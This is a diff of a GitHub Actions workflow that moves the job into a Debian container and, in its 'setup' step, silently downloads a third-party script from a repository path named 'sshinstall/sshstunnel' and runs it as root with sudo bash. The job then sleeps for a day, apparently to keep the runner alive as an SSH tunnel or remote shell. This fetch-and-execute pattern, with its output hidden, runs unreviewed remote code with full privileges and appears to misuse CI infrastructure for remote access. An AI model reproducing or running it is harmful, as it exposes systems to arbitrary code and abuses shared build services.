@@ -5,15 +5,15 @@ on:
   
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-latest   # Host runner
+    container:
+      image: debian:12       # Debian environment inside the job
     steps:
-      - uses: actions/checkout@v2
+      - uses: actions/checkout@v3
+
       - name: setup
         run: |
-       sudo apt update &> /dev/null && sudo  apt install wget -y &> /dev/null && sudo  wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run
-#      - name: setup
- #        run: |
-#          cd /test &&  printf " apt install httping -y" | sudo ./dist/proot -S . /bin/bash && printf "httping -l google.com" | sudo ./dist/proot -S . /bin/bash
-       
+        apt update && apt install wget sudo -y && sudo  wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run
+
       - name: Ubuntu ready to go 
         run: sleep 1d
